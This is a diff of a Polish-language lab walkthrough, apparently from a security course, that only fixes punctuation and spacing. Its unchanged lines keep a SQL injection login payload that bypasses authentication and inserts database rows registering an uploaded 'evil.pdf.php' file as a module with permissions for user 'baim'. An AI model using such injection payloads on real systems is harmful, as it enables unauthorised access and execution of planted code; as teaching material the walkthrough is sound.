@@ -2,7 +2,7 @@
 
 ## Metoda SQLi
 
-Nie rozwodząc się za bardzo nad działaniem tego zapytania w formularzu logowania należy wprowadzić:
+Nie rozwodząc się za bardzo nad działaniem tego zapytania, w formularzu logowania należy wprowadzić:
 
 ```
 Login: ' OR 1=1; INSERT INTO modules(path, name) VALUES ('../../uploads/evil.pdf.php', 'Evil'); INSERT INTO permissions(module_id, user_id) VALUES (2, 1); --
@@ -28,7 +28,7 @@ Hasło: <dowolne>
 
 ![Widok insert modules](images/modules.png)
 
-6. Następnie przejdź do tabeli **permissions** i dodaj dla użytkownika **baim** (jego id jest równe1) dostęp do modułu o id równym 2
+6. Następnie, przejdź do tabeli **permissions** i dodaj dla użytkownika **baim** (jego id jest równe 1) dostęp do modułu o id równym 2
 
 ![Widok insert permissions](images/permissions.png)
 
